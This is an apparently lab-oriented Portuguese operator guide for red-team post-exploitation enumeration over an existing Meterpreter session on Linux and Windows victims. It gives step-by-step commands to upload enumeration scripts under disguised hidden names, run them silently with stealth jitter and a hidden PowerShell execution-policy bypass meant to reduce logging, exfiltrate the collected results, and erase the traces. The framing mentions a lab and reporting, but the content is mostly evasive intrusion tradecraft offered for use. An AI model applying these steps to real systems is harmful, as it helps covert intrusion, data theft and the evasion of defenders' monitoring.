# USAGE — enum_linux.sh & enum_windows.ps1

Guia operacional da fase 04 (Enumeration). Assume foothold já estabelecido
(shell reverso Meterpreter) conforme fase 03.

---

## 0. Pré-requisitos

**Linux (vítima):** bash 4+, coreutils (`timeout`, `find`, `grep`, `ss/ip`).
Tudo nativo — nada é instalado na vítima.

**Windows (vítima):** PowerShell 3+ (script usa CIM cmdlets; testado em 5.1).
Nada é instalado na vítima.

**Operador (Debian12):** Metasploit com sessão Meterpreter ativa.

---

## 1. Linux — passo a passo

### 1.1 Preparar o script no operador

```
cd ~/lab/Red_Team_Repo/04_Enumeration/Enum2.0/scripts
bash -n enum_linux.sh                  # valida sintaxe sem executar
shellcheck enum_linux.sh               # qualidade (opcional)
chmod +x enum_linux.sh

```

### 1.2 Teste local ANTES de tocar a vítima (regra de ouro)

Rode no próprio lab/Kali/ Debian  primeiro. Se quebrar aqui, quebre na sua mão, não na sessão da vítima:

```
./enum_linux.sh --checks current_user,suid_binaries
cat enum_*/findings.json               # confere a triagem funcionando
rm -rf enum_*                          # limpa o teste

```

### 1.3 Delivery via Meterpreter

Na sessão Meterpreter da vítima:

```
meterpreter > sysinfo                  # confirme que é Linux e veja o arch
meterpreter > upload enum_linux.sh /tmp/.sys-cache
meterpreter > shell                    # entra no shell da vítima

```
### 1.4 Execução na vítima

# Execução silenciosa, output em path neutro:

```
chmod +x /tmp/.sys-cache
/tmp/.sys-cache --quiet --output /tmp/.sys-tmp

```
# Se o host parecer monitorado (ou por padrão em operação real):

```
/tmp/.sys-cache --quiet --stealth --output /tmp/.sys-tmp

```
# Só uma coleta rápida (ex.: sudo check apenas):

```
/tmp/.sys-cache --quiet --checks current_user --output /tmp/.sys-tmp
exit   # volta pro Meterpreter

```

### 1.5 Exfiltração dos resultados

```
meterpreter > download /tmp/.sys-tmp ./evidence/raw/

```
### 1.6 Cleanup (SEMPRE)

```
meterpreter > shell
rm -rf /tmp/.sys-cache /tmp/.sys-tmp
exit
```

Confira contra evidence/raw/cleanup_manifest.txt — tudo listado ali deve ter sido removido. Esse par "manifest vs. verificação" vai no relatório.

### 1.7 Leitura dos resultados (no operador)
```
ls evidence/raw/                       # um .txt por check
cat evidence/raw/manifest.jsonl        # o que foi coletado, quando, técnica ATT&CK
cat evidence/raw/environment.txt       # contexto: root? container? monitorado?
cat evidence/raw/findings.json         # TRIAGEM: achados + severidade + next-action
```

### 2. Windows — passo a passo

*2.1 Preparar o script no operador*

```
cd ~/lab/Red_Team_Repo/04_Enumeration/Enum2.0/scripts
# validação de sintaxe sem executar (PSParser):
pwsh -NoP -c "[System.Management.Automation.PSParser]::Tokenize((Get-Content -Raw enum_windows.ps1), [ref]\$null) | Out-Null; 'syntax OK'"
```

### 2.2 Delivery via Meterpreter

```
meterpreter > sysinfo                  # confirme Windows + arquitetura
meterpreter > upload enum_windows.ps1 C:\\Windows\\Temp\\.cache.ps1
```
### 2.3 Execução na vítima

```
meterpreter > execute -f powershell.exe -a \
  "-NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\.cache.ps1 \
   -Quiet -OutputDir C:\Windows\Temp\.cache_out"

```

*Variações úteis:*

# Só coleta rápida (menos eventos 4104):
```
... -File ... -Quiet -Checks current_user,always_installelevated

```
# Reexecutar após queda de sessão (não refaz o que já coletou):

```
... -File ... -Quiet -Resume -OutputDir C:\Windows\Temp\.cache_out

```
*Alternativa interativa (quando o shell já é PowerShell):*

```
PS> Set-ExecutionPolicy Bypass -Scope Process -Force
PS> .\C:\Windows\Temp\.cache.ps1 -Quiet

```

### 2.4 Exfiltração dos resultados

```
meterpreter > download C:\Windows\Temp\.cache_out ./evidence/raw/
```

### 2.5 Cleanup (SEMPRE)

```
meterpreter > shell
del C:\Windows\Temp\.cache.ps1
rmdir /s /q C:\Windows\Temp\.cache_out
exit

```
Confira contra cleanup_manifest.txt como no fluxo Linux.

### 2.6 Leitura dos resultados

```
cat evidence/raw/findings.json         # triagem classificada
cat evidence/raw/environment.json      # monitored? Script Block Logging? EDR?
cat evidence/raw/manifest.jsonl        # auditoria do que rodou

```

### 3. Flags comuns aos dois scripts

```
Flag	Efeito	Quando usar
'--output DIR / -OutputDir	Diretório de evidência customizado	Sempre, em operação real (path neutro)
'--quiet / -Quiet	Sem output no console da vítima	Sempre em operação real
'--stealth	Jitter entre checks + adaptação	Host possivelmente monitorado
'--checks a,b / -Checks	Roda só o subconjunto listado	Coleta rápida, sessão instável
'--resume / -Resume	Pula checks já coletados	Sessão morreu no meio; retomar
```

### 4. Fluxo completo (resumo de 6 passos)

01. Teste local no operador (--checks curto) — nunca teste direto na vítima.
02. Upload com nome neutro em diretório temporário.
03. Execução silenciosa (--quiet, output neutro; --stealth se monitorado).
04. Download dos resultados para evidence/raw/ no operador.
05. Cleanup na vítima + verificação contra cleanup_manifest.txt.
06. Triage: findings.json alimenta report/04_enumeration.md (F-04-XX).

### 5. Troubleshooting rápido

```
Sintoma	Causa provável	Ação
timeout: command not found (Linux)	coreutils minimal	Script degrada sozinho (logs no manifest)
Output vazio em um check	Permissão/timeout	Ver header ### timeout_or_error no .txt
PowerShell fecha sem output	Constrained Language Mode	Check environment.json; use -Checks reduzido
findings.json vazio	Nenhum achado triado	Não é erro — seção "Negative Results" do report usa isso
Sessão morreu no meio	—	Retome com --resume / -Resume no mesmo OutputDir

```












